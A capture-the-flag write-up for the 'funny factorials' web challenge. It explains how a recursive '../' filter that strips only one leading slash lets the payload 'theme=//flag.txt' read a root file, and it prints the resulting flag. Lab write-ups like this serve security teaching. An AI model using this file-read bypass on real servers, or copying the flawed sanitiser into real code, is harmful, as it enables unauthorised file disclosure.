# funny factorials

## Description

> I made a factorials app! It's so fancy and shmancy. However factorials don't seem to properly compute at big numbers! Can you help me fix it?
>
> Author: stuxf
>
> [`funny-factorials.amt.rs`](https://funny-factorials.amt.rs/)
>
> Downloads:\
> [`app.py`](app.py) > [`Dockerfile`](Dockerfile)

Tags: _web_

## Solution

This is a website that calculates factorial given a number, also it has a light and dark mode. We are given two files, the application in Python and a docker file. By reading Dockerfile, we notice that the flag is in root `/flag.txt`. On the other hand, we can see in the source code that route handlers retrieve a style sheet given a _theme_ argument in the URL, which could open the door for a directory traversal attack.

```c
safe_theme = filter_path(request.args.get("theme", "themes/theme1.css"))
```

Nevertheless, we also notice that it passes through a recursive validation function `filther_path` which changes any `../` for an empty string, making it impossible for an attacker to provide any relative URL path.

```python
def filter_path(path):
    # print(path)
    path = path.replace("../", "")
    try:
        return filter_path(path)
    except RecursionError:
        # remove root / from path if it exists
        if path[0] == "/":
            path = path[1:]
        print(path)
        return path
```

It also removes root `/` from path when function reaches the recursive limit settled in the last lines of the source code.

```python
if __name__ == '__main__':
    sys.setrecursionlimit(100)
    app.run(host='0.0.0.0')
```

Removing root from the path prevents us to retrieve the flag using absolute URL paths like `/flag.txt`. However, it removes root just once, allowing us to write `//flag.txt` or `/////flag.txt`. In this way, if we pass the URL the argument `theme=//flag.txt` like this:

```
https://funny-factorials.amt.rs/?theme=//flag.txt
```

We get the flag nested in a style label:

```html
<head>
  <title>Factorial Calculator</title>
  <!-- inline styles passed into the template -->
  <style>
    amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}
  </style>
</head>
```

Flag `amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}`
